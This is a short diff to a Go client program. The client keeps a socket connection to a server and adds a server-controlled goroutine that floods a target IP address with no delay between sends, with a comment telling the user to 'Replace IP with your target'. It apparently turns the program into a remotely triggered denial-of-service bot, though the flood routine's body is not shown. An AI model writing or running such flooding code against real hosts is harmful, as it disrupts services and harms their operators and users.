@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/signal"
 	"syscall"
+	"time"
 )
 
 func main() {
@@ -17,13 +18,17 @@ func main() {
 	defer conn.Close()
 	fmt.Println("Socket connection established.")
 
-	go socket.ReadFromServer(conn)
+	controlChan := make(chan bool)
+
+	go socket.StartReadingFromServer(conn, controlChan)
+
+	// Replace IP with your target
+	go socket.RunFlood(controlChan, "192.168.1.101", 0*time.Millisecond)
 
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 
 	fmt.Println("Press Ctrl+C to exit...")
 	<-sig
-
-	fmt.Println("Exiting now.")
+	fmt.Println("Exiting program")
 }
